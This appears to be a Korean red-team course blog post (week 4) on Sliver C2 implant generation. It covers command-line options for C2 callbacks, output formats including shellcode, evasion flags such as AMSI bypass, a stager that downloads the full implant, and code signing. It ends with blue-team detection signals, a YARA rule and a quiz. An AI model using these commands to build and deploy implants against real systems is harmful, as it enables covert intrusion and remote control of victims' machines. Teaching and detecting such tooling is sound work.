---
layout: post
title: "Sliver Week 4: Implant 생성 옵션 + 포맷"
date: 2026-05-19 11:00:00 +0900
categories: security red-team c2 sliver senior
---

## 학습 목표

- generate 명령의 모든 옵션.
- 포맷 종류 (exe, shellcode, shared lib, service).
- Profile로 표준화.

## 1. 핵심 옵션

```sliver
sliver > generate \
  --mtls primary.lab:8443 \
  --https backup.lab \
  --dns dns.lab \
  --os windows \
  --arch amd64 \
  --format exe \
  --name corp-payroll \
  --save /tmp/
```

- `--os`: windows / linux / darwin.
- `--arch`: amd64 / 386 / arm64.
- `--format`: exe / shared / service / shellcode.

## 2. Format 종류

### exe
독립 실행 파일. Windows .exe / Linux ELF.

### shared
DLL / .so. process injection 또는 LoadLibrary로.

### service
Windows service binary.

### shellcode
순수 shellcode. Cobalt Strike beacon shellcode 같은 형식.

## 3. 추가 OpSec 옵션

```sliver
generate \
  --debug=false \
  --evasion \
  --skip-symbols \
  --canary canary-domain.com \
  --max-errors 10 \
  --reconnect 60 \
  --poll-timeout 60
```

- `--evasion`: anti-debug + AMSI bypass 등 (Windows).
- `--skip-symbols`: 디버그 심볼 제거. 분석 어렵게.
- `--canary`: implant가 자기 분석되면 alert.

## 4. Profile

같은 옵션 자주 쓰면 profile 저장:
```sliver
sliver > profiles new --mtls lab.com:8443 --os linux --arch amd64 standard
sliver > generate --profile standard --save /tmp/
```

팀 단위 표준화.

## 5. Stager

작은 stager → 큰 implant 다운로드. crypto challenge.

```sliver
sliver > generate stager --lhost lab.com --lport 8443
```

stager는 ~1KB.

## 6. 서명

자체 인증서로 binary 서명 (Windows code signing). 더 자연.
```sliver
sliver > generate --sign cert.pfx --sign-pass <pwd>
```

## 7. Blue Team 관점

탐지 신호:
- Go-compiled binary (`runtime.main`, `golang.org/x` 문자열).
- Sliver 특정 strings (`sliver`, `wireguard`).
- Static unique pattern (YARA rule 가능).
- Unsigned binary in privileged location.
- Suspicious imports (network + crypto + process injection).

YARA rule 예 (단순화):
```yara
rule sliver_implant_basic {
    strings:
        $a = "BishopFox"
        $b = "wireguard.com"
        $c = "sliver"
    condition:
        2 of them
}
```

## 8. 자가평가

### Q1. format 4종?
1. **exe / shared / service / shellcode**
2. UI 3. 무관 4. 1개

**정답: 1.**

### Q2. Profile 가치?
1. **표준화 + 재사용**
2. UI 3. 빠름 4. 무관

**정답: 1.**

### Q3. Stager?
1. **작은 → 큰 implant 다운로드**
2. UI 3. 빠름 4. 무관

**정답: 1.**

### Q4. Canary?
1. **분석되면 alert (실험실 발견)**
2. UI 3. 빠름 4. 무관

**정답: 1.**

### Q5. Blue team YARA?
1. **static string 패턴 매칭 rule**
2. UI 3. 빠름 4. 무관

**정답: 1.**

## 9. 다음 주차

[Week 5: Session 모드].
